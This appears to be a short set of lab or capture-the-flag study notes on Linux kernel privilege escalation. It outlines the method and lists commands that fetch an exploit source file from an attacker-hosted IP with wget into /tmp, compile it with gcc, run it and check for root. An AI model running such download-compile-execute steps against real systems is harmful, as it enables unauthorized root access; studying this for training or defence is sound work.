Privilege Escalation: Kernel Exploits

-Privilege escalation ideally leads to root privileges. 
This can sometimes be achieved simply by exploiting an existing vulnerability, 
or in some cases by accessing another user account that has more privileges, information, or access.

The privilege escalation process will rely on misconfigurations and lax permissions.

The kernel on Linux systems manages the communication between components such as the memory on the system and applications.
This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.

    The Kernel exploit methodology is simple;

        ->Identify the kernel version
        ->Search and find an exploit code for the kernel version of the target system
        ->Run the exploit


If you try to simple wget you will got the Permission Denied as you can not write to that particular folder, 
actually the safest way to check the permissions is to run:
    ->ls -al 
and check which directory will be suitable, in this case letâ€™s try to write to tmp folder!

check this all right folder:
    drwxrwxrwt   4 root root  4096 Oct 30 20:54 tmp

From tmp:
    wget http://10.18.52.151:8000/Desktop/c.c <- CVE: https://www.exploit-db.com/exploits/33824
    gcc c.c -o exploit <- compile C script 
    ./exploit
    whoami
    hostname
